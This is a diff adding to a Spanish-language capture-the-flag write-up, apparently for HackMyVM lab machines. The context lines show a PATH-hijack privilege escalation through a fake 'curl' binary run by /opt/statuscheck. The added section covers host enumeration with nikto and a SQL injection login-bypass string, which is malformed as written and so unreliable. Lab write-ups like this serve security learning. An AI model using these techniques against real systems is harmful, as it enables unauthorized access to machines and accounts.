@@ -161,3 +161,25 @@ chmod +x curl
 ./curl #inicia una sesión anidada
 /opt/statuscheck #en el momento que encuentre curl obtendremos una bash
 ```
+
+## Segunda máquina
+
+Servicios vulnerables: 80.
+
+No se acceden a los recursos de forma correcta y comprobamos el código fuente y descubrimos un dominio con el que lo añadimos a /etc/hosts.
+
+```bash
+10.0.2.53    doc.hmv
+```
+
+Enumeramos directorios.
+
+```
+nikto -url http://doc.hmv
+```
+
+En el panel de Login.
+
+```
+' OR==1-- -'
+```
